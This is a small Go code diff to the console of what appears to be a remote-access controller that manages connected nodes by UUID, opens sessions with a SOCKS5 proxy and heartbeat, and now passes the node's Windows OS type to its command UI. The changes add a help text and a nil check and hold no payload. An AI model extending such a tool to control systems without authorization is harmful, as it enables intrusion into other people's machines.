@@ -60,6 +60,12 @@ func main() {
 		if len(cmd) == 0 {
 			continue
 		}
+		if cmd == "help" {
+			fmt.Println(`
+session       --print all nodes info
+session uuid  --wait special uuid come back`)
+			continue
+		}
 		strarr := strings.Split(cmd, " ")
 		if strarr[0] != "session" {
 			fmt.Println("unknown command")
@@ -76,7 +82,8 @@ func main() {
 }
 
 func session(uuid string, scanner *bufio.Scanner) {
-	if !ginfomgr.Exist(uuid) {
+	pinfo := ginfomgr.GetInfo(uuid)
+	if pinfo == nil {
 		fmt.Println("uuid is not exist")
 		return
 	}
@@ -90,7 +97,7 @@ func session(uuid string, scanner *bufio.Scanner) {
 	SetSocks5Server(psocks)
 	go sessionRead(conn, pcmd, psocks)
 	go loopHeartBeat(conn)
-	pcmd.ProcUI(scanner)
+	pcmd.ProcUI(pinfo.OSType == "windows", scanner)
 }
 
 func loopHeartBeat(conn *util.SSLConn) {
